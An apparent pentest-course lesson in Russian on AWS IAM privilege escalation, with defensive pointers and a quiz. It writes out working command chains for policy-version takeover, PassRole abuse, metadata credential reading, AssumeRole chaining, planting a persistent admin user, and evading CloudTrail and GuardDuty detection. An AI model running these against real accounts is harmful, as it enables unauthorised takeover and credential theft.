---
id: cloud-privesc-iam
title: "Эскалация привилегий в IAM: из слабого ключа в админа"
category: cloud
parent: cloud-iam-attack
difficulty: hard
order: 3
tags: [cloud, iam, privesc, aws, pacu, enumerate-iam, exploitation]
prerequisites: [cloud-iam-basics, cloud-credential-hunting]
useful_for:
  - "Повышение прав от ограниченного ключа до администратора"
  - "Реальные пентесты AWS-аккаунтов"
  - "CTF с 'найди путь к админу'"
estimated_minutes: 55
summary: "Разбираем конкретные IAM-права, которые позволяют повысить привилегии: CreatePolicyVersion, PassRole, AttachUserPolicy, AssumeRole и другие. Учимся строить путь эскалации и проверять его инструментами."
---
## Инструменты разведки прав

Первый шаг всегда один и тот же — понять, кто вы и что можете:

```bash
aws sts get-caller-identity
enumerate-iam --access-key AKIA... --secret-key ... --session-token ... --brute-force
pacu
> import_keys default
> run iam__enum_permissions
> run iam__privesc_scan
pmapper --profile default graph create --include-all
pmapper --profile default query 'preset privesc *'
```

Флаги `enumerate-iam`: `--access-key`, `--secret-key`, `--session-token`, `--brute-force`. Модули pacu: `iam__enum_permissions`, `iam__privesc_scan`, `iam__enum_users_roles_policies_groups`. `pmapper query 'preset privesc *'` показывает все известные пути эскалации от вашей сущности.

## Каталог прав-мостов

| Право | Как эксплуатировать |
|-------|---------------------|
| iam:CreatePolicyVersion | создать версию политики с `*`, `--set-as-default` |
| iam:SetDefaultPolicyVersion | активировать подходящую версию |
| iam:CreateAccessKey | выпустить ключи другого пользователя |
| iam:CreateLoginProfile | задать пароль консоли |
| iam:UpdateLoginProfile | сменить пароль |
| iam:AttachUserPolicy | привязать AdministratorAccess |
| iam:AttachGroupPolicy | то же для группы |
| iam:PutUserPolicy | inline-политика с `*` |
| iam:PutGroupPolicy | inline для группы |
| iam:PutRolePolicy | inline для роли |
| iam:AddUserToGroup | добавить себя в привилегированную группу |
| iam:UpdateAssumeRolePolicy | переписать trust роли |
| iam:PassRole + ec2:RunInstances | запустить инстанс с ролью |
| iam:PassRole + lambda:CreateFunction | выполнить код с ролью |
| iam:PassRole + glue:CreateDevEndpoint | RCE на Glue |
| sts:AssumeRole | встать на роль |
| iam:UploadSSHPublicKey | SSH-ключ для CodeCommit |

## Пример: CreatePolicyVersion

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::111122223333:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
aws iam get-policy-version --policy-arn arn:aws:iam::111122223333:policy/MyPolicy --version-id v2
```

Если право привязано к вашей политике — вы мгновенно админ. Часто требует `iam:SetDefaultPolicyVersion` отдельно.

## Пример: PassRole + RunInstances

```bash
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro \
  --iam-instance-profile Name=HighPrivProfile --count 1 \
  --query 'Instances[0].InstanceId' --output text
# затем на инстансе (SSM/SSH) читаем роль
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/HighPrivRole
```

Более скрытный вариант — Lambda (без SSH и без публичного IP):

```bash
aws lambda create-function --function-name x --runtime python3.12 \
  --role arn:aws:iam::111122223333:role/HighPrivRole \
  --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name x out.txt && cat out.txt
```

`payload.zip` возвращает переменные окружения и метаданные роли; так вы получаете её креды.

## Пример: AssumeRole-цепочки

```bash
aws sts assume-role --role-arn arn:aws:iam::111122223333:role/AdminRole \
  --role-session-name s --query 'Credentials' --output json > c.json
export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId c.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey c.json)
export AWS_SESSION_TOKEN=$(jq -r .SessionToken c.json)
aws sts get-caller-identity
```

## Разобранный пример: полный путь от read-only до админа

1. `aws sts get-caller-identity` → роль `DevRole`.
2. `enumerate-iam` → доступны `iam:CreatePolicyVersion`, `iam:ListPolicies`.
3. Находим политику `DevPolicy`, на которой сидим.
4. `create-policy-version --set-as-default` с `Action:*`.
5. `enumerate-iam` повторно → `iam:*`, `s3:*`, `ec2:*`.
6. Создаём админ-пользователя и ключ для персистентности:
   ```bash
   aws iam create-user --user-name svc-backup
   aws iam attach-user-policy --user-name svc-backup \
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   aws iam create-access-key --user-name svc-backup
   ```

## Проверка и откат

После эскалации проверьте, что права реально применились (`get-caller-identity` + тестовый вызов), и зафиксируйте исходные версии политик, чтобы откатить изменения в рамках пентеста.

## Частые ошибки

- Начинать с эксплуатации, не собрав карту прав (`enumerate-iam`).
- Забывать про permission boundary/SCP — право есть, но не работает.
- Игнорировать `iam:PassRole` как «безобидное» — это самый частый мост.
- Не проверять, что роль для PassRole действительно имеет больше прав.
- Оставлять следы (новые пользователи без пометки) — нарушает правила engagement.

## Что дальше / решение

Найдя путь, задокументируйте его как цепочку (`add_attack_step`), подтвердите админ-доступ и переходите к цели engagement. Для защиты — закрывайте PassRole, мониторьте `CreatePolicyVersion`/`AttachUserPolicy` в CloudTrail, внедряйте permission boundaries и SCP.

## Сопоставление с GCP и Azure

Механика эскалации отличается, но идея одна — превратить одно право в другое.

| AWS-мост | GCP-аналог | Azure-аналог |
|----------|-----------|--------------|
| iam:CreatePolicyVersion | setIamPolicy на проекте | назначение роли Owner |
| iam:PassRole | iam.serviceAccounts.actAs | управляемая идентичность |
| iam:CreateAccessKey | создание ключа SA | ключ приложения/сервис-принципал |
| sts:AssumeRole | impersonate SA | federated credential |
| iam:UpdateAssumeRolePolicy | setIamPolicy binding | изменённый role assignment |

В GCP чаще встречается `serviceAccountTokenCreator` (выпуск токенов чужого SA) и `serviceAccountUser` (запуск compute под SA). В Azure — права на `Microsoft.ManagedIdentity/*` и `Microsoft.Authorization/roleAssignments/write`.

## OPSEC и обнаружение

Каждый вызов IAM пишется в CloudTrail, а GuardDuty имеет детект `PrivilegeEscalation:IAMUser`. Что снижает шанс быть пойманным:

- Работать из уже «шумной» сущности (роль приложения).
- Минимизировать число API-вызовов: сначала `enumerate-iam` в режиме без `--brute-force`.
- Не создавать очевидных админов без пометки в рамках engagement.
- Не трогать production-политики без необходимости.

Что, наоборот, палит: `CreatePolicyVersion` с `Action:*`, `AttachUserPolicy` на AdministratorAccess, `CreateAccessKey` на чужого пользователя, всплеск `GetCallerIdentity`.

## Практика: построение карты прав

1. `aws sts get-caller-identity` — фиксируем стартовую точку.
2. `enumerate-iam` — список разрешённых API.
3. Сопоставляем с таблицей мостов — какие пути открыты.
4. Для каждого моста строим минимальный PoC-вызов.
5. Проверяем результат через `get-caller-identity`/тестовый вызов.
6. Записываем цепочку в engagement state (`add_attack_step`).

Так вы получаете не «список прав», а «список путей к админу», отсортированный по сложности.

## Практический разбор: PassRole в Lambda вместо EC2

EC2 требует сети и времени на загрузку. Lambda быстрее и тише, но требует `lambda:CreateFunction` и `iam:PassRole`. Ещё тише — `glue:CreateDevEndpoint` (SSH к dev-endpoint с ролью) или `cloudformation:CreateStack` с ролью. Выбор инструмента зависит от того, какие compute-права есть.

## Чек-лист

- [ ] Определена стартовая идентичность.
- [ ] Перечислены разрешённые API.
- [ ] Проверены все «мосты» из таблицы.
- [ ] Подтверждён админ-доступ.
- [ ] Зафиксирована цепочка и доказательства.
- [ ] Оценено влияние и выданы рекомендации.

## Разбор типовых конфигураций в реальных аккаунтах

Чаще всего эскалация прячется не в явном `Action:*`, а в комбинациях. Пример: разработчик получает `iam:PassRole` на все роли (`Resource:*`), потому что «ему нужно деплоить». Вместе с `lambda:CreateFunction` и `lambda:InvokeFunction` это полный путь к админу: создать функцию с админ-ролью, выполнить код, забрать креды. Другой пример: `iam:CreatePolicyVersion` на конкретной политике — выглядит безобидно, пока не поймёшь, что эта политика привязана к тебе.

Третий частый случай — `iam:AddUserToGroup` на группу, которая называется нейтрально (`developers`), но имеет `AdministratorAccess` через вложенную политику. Проверяйте не имена, а эффективные права.

## Автоматизация проверки

```bash
# облачный аудит
prowler aws --profile default --severity critical high -M json-ocsf -o out/
# поиск путей эскалации
pmapper --profile default graph create --include-all
pmapper --profile default query 'preset privesc *' > privesc.txt
# анализ конкретной политики
cloudsplaining scan-policy-file --input-file policy.json
```

Регулярный прогон `pmapper query 'preset privesc *'` в CI ловит новые пути сразу после изменения политик. Для защитника это дешёвый способ держать IAM под контролем.

## Квиз

```quiz
- question: "Какое право позволяет прикрепить AdministratorAccess к себе?"
  options:
    - "iam:AttachUserPolicy"
    - "s3:PutObject"
    - "ec2:DescribeInstances"
    - "logs:CreateLogGroup"
  answer: 0
  explanation: "AttachUserPolicy назначает управляемую политику пользователю."
- question: "Что делает iam:CreatePolicyVersion с политикой?"
  options:
    - "Создаёт новую версию документа политики (можно с Action *)"
    - "Удаляет политику"
    - "Переименовывает роль"
    - "Меняет регион"
  answer: 0
  explanation: "Новая версия может разрешать всё."
- question: "Почему iam:PassRole опасен?"
  options:
    - "С ним сервис запускается от имени более привилегированной роли"
    - "Он шифрует данные"
    - "Он удаляет ключи"
    - "Он безвреден"
  answer: 0
  explanation: "PassRole + запуск ресурса = использование чужой роли."
- question: "Как найти валидную роль для AssumeRole?"
  options:
    - "Смотреть trust policy на wildcard principal без Condition"
    - "Смотреть теги EC2"
    - "Смотреть размер диска"
    - "Смотреть логи S3"
  answer: 0
  explanation: "Wildcard trust позволяет принять роль любому."
- question: "Какой инструмент автоматизирует AWS-эскалацию?"
  options:
    - "Pacu"
    - "nmap"
    - "sqlmap"
    - "ffuf"
  answer: 0
  explanation: "Pacu — фреймворк AWS-эксплуатации."
```

## Где пригодится

- **Пентест AWS:** от ограниченного ключа к администратору.
- **Red team:** цепочки AssumeRole и PassRole.
- **CTF:** задачи «найди путь к админу».
- **Работа/DevSecOps:** least-privilege, boundaries, аудит PassRole.
- **Дальше по дереву:** `cloud-assume-role`, `cloud-lambda-privesc`.
